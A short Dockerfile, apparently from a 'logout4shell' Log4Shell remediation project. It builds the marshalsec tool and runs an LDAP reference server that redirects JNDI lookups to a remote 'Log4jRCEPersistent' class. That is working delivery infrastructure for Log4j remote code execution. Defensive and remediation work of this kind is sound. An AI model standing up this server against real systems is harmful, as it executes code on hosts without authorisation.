FROM ubuntu:21.04 as ldap-builder
RUN mkdir /opt/build_logout4shell
RUN apt-get update && apt-get install -y git default-jdk maven && apt-get clean && rm -f /var/lib/apt/lists/*_*
RUN cd /opt/build_logout4shell && git clone https://github.com/mbechler/marshalsec.git && cd ./marshalsec  && mvn package -DskipTests




FROM ubuntu:21.04 as ldapserver
RUN apt-get update && apt-get install -y openjdk-11-jre-headless && apt-get clean && rm -f /var/lib/apt/lists/*_*
COPY --from=ldap-builder /opt/build_logout4shell/marshalsec/target/* /opt/marshalsec/
WORKDIR /opt/marshalsec/
ENTRYPOINT [ "java", "-cp", "marshalsec-0.0.3-SNAPSHOT-all.jar", "marshalsec.jndi.LDAPRefServer", "http://security:8888/#Log4jRCEPersistent"] 
